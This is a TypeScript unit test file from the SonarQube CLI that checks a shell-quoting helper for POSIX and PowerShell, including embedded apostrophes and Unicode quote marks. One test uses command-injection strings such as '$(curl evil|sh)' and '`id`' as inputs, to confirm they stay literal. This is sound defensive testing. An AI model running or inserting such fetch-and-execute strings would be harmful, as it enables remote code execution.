/*
 * SonarQube CLI
 * Copyright (C) SonarSource Sàrl
 * mailto:info AT sonarsource DOT com
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

import { describe, expect, it } from 'bun:test';

import { shellQuote } from '@/core/host/shell-quote.ts';

describe('shellQuote', () => {
  it.each(['sonar', 'a/b.c-d_e', 'org:key@1'])('leaves %s bare', (value) => {
    expect(shellQuote(value, 'linux')).toBe(value);
  });

  it('single-quotes values with spaces', () => {
    expect(shellQuote('my dir', 'linux')).toBe("'my dir'");
  });

  it.each(['$(curl evil|sh)', '`id`', '$HOME'])(
    'keeps %s literal inside single quotes',
    (value) => {
      expect(shellQuote(value, 'linux')).toBe(`'${value}'`);
    },
  );

  it('escapes an embedded apostrophe for POSIX shells', () => {
    expect(shellQuote("it's", 'linux')).toBe(String.raw`'it'\''s'`);
  });

  it.each(["'", '‘', '’', '‚', '‛'])('doubles an embedded %s for PowerShell', (quote) => {
    expect(shellQuote(`it${quote}s`, 'win32')).toBe(`'it${quote}${quote}s'`);
    expect(shellQuote(`it${quote}s`, 'linux')).toBe(
      quote === "'" ? String.raw`'it'\''s'` : `'it${quote}s'`,
    );
  });
});
